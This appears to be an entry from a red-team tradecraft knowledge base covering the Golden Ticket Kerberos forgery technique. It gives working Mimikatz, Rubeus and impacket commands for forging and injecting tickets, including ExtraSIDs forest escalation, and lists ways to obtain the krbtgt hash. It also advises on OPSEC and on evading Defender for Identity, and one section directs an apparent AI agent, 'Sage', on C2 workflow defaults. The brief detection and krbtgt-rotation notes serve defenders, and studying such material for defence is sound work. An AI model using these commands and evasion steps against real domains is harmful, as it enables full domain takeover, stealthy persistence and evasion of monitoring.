---
name: Golden Ticket
category: kerberos
subcategories: [ticket-forgery, krbtgt, persistence, domain-persistence]
tradecraft_tags: [golden-ticket, krbtgt, kerberos, persistence, domain-compromise, technique]
mitre_attack:
  - id: T1558.001
    name: Steal or Forge Kerberos Tickets — Golden Ticket
source:
  url: https://attack.mitre.org/techniques/T1558/001/
  license: none
  maintained: false
binary_type: none
binary_filename: ""
supported_os: [windows]
architecture: [x64]
privilege_required: none
network_required: false
detection_signal: |
  Golden tickets with unusual group memberships (e.g. RID 500 + Enterprise Admins SID
  in a user-domain TGT), unusually long lifetimes (>10 hours), or wrong domain SID
  are detectable by Defender for Identity and custom event correlation. PAC validation
  against the KDC is the primary technical detection mechanism. Modern MDI compares
  TGT content against expected LDAP user attributes.
usage_examples:
  - description: Forge a golden ticket (Mimikatz) — requires krbtgt hash
    args: "kerberos::golden /user:Administrator /domain:north.sevenkingdoms.local /sid:S-1-5-21-... /krbtgt:<krbtgt-nthash> /ptt"
  - description: Golden ticket with ExtraSIDs (for cross-domain / forest escalation)
    args: "kerberos::golden /user:Administrator /domain:child.corp.local /sid:S-1-5-21-CHILD-... /sids:S-1-5-21-PARENT-519 /krbtgt:<krbtgt-hash> /ptt"
  - description: Rubeus golden ticket
    args: "Rubeus.exe golden /user:Administrator /domain:north.sevenkingdoms.local /sid:S-1-5-21-... /rc4:<krbtgt-nthash> /ptt"
  - description: impacket golden ticket (Linux-side)
    args: "ticketer.py -nthash <krbtgt-nthash> -domain-sid S-1-5-21-... -domain north.sevenkingdoms.local administrator"
opsec_notes: |
  Golden tickets are valid until krbtgt is rotated (requires TWO rotations ~10 hours apart
  to fully invalidate; DCs cache the previous krbtgt for backward compatibility). Use
  reasonable ticket lifetimes (10 hours — default) rather than 10-year tickets, which are
  trivially detectable. ExtraSIDs golden tickets for cross-forest escalation generate
  unusual PAC content detectable by MDI. With Mimikatz, always include `/ptt` when the
  goal is immediate in-memory use: without `/ptt`, `kerberos::golden` writes `ticket.kirbi`
  to the current working directory; `/ticket:<path>` is only for intentional disk output.
gotchas: |
  Requires the krbtgt account's NT hash — obtainable only via DCSync (DA+), NTDS.dit
  extraction, or shadow credentials on the krbtgt account (unusual). The golden ticket
  must contain a valid domain SID (S-1-5-21-...) — wrong SID = immediate rejection.
  Golden tickets bypass krbtgt password changes ONLY for the first change — the second
  change (performed ~10h after the first) invalidates all tickets. Two-step krbtgt rotation
  is the correct post-compromise remediation.
related_ttps: [mimikatz, rubeus, impacket-ticketer, impacket-secretsdump, sid-history-abuse]
alternatives: [silver-ticket, certificate-persistence, dcsync-to-maintain-access]
common_args: {}
last_updated: 2026-06-08
---

# Golden Ticket

A forged Kerberos TGT encrypted with the domain's krbtgt account NT hash. Because the
KDC trusts any correctly-encrypted TGT, a golden ticket allows authenticating as any
user — including users that don't exist — with any group membership claims. The krbtgt
hash is the "master key" of a Kerberos realm.

## Obtaining the krbtgt Hash

| Method | Prerequisites |
|--------|--------------|
| DCSync (Apollo dcsync) | DCSync rights (DA / krbtgt ACL) |
| NTDS.dit extraction | SYSTEM on DC |
| Mimikatz lsadump::dcsync | Network access to DC + DCSync rights |
| Shadow Credentials on krbtgt | GenericWrite on krbtgt account (rare) |

## Forgery Process

```
# Step 1: Get domain SID
PowerView: Get-Domain | Select DomainSid
Seatbelt: OSInfo (shows domain SID)

# Step 2: Forge and inject
Mimikatz: kerberos::golden /user:Administrator /domain:DOMAIN \
  /sid:S-1-5-21-... /krbtgt:<krbtgt-hash> /ptt

# OPSEC: omitting /ptt writes ticket.kirbi to cwd. Use /ticket:<path> only
# when a reusable .kirbi artifact is explicitly required.

# Verify:
klist     (shows injected TGT)
```

## Disk Artifact Warning

Mimikatz `kerberos::golden` defaults to saving a forged `.kirbi` file when `/ptt` is not present.
For C2-driven workflows, Sage should default to `/ptt` and inject the TGT into the selected
logon session or sacrificial LUID. File output belongs only in explicit operator-approved cases.

## Golden Ticket vs Silver Ticket vs Certificate Persistence

| Technique | Requires | Validity | Scope |
|-----------|----------|---------|-------|
| Golden Ticket | krbtgt hash | Until 2x krbtgt rotation | Any user, any service, any host |
| Silver Ticket | Service hash | Until account password change | Specific service + host |
| Certificate (ForgeCert) | CA private key | Until cert expiry (chosen at forge time) | Any user that can enroll |

## Post-Compromise Persistence Recommendation

Golden tickets are powerful but have a known remediation path (two-step krbtgt rotation).
Certificate-based persistence (ForgeCert) is more durable — CA key rotation is rarely
performed and certificates can have multi-year validity. For long-term persistence, prefer
the certificate path over golden tickets when a CA private key is obtainable.

## MDI Detection Evasion Notes

Avoid detection by:
- Using realistic ticket lifetimes (10h, not 10-year)
- Using actual group SIDs (not invented group RIDs)
- Matching ticket content to the actual user's LDAP attributes
- Not adding ExtraSIDs unless cross-forest movement is needed
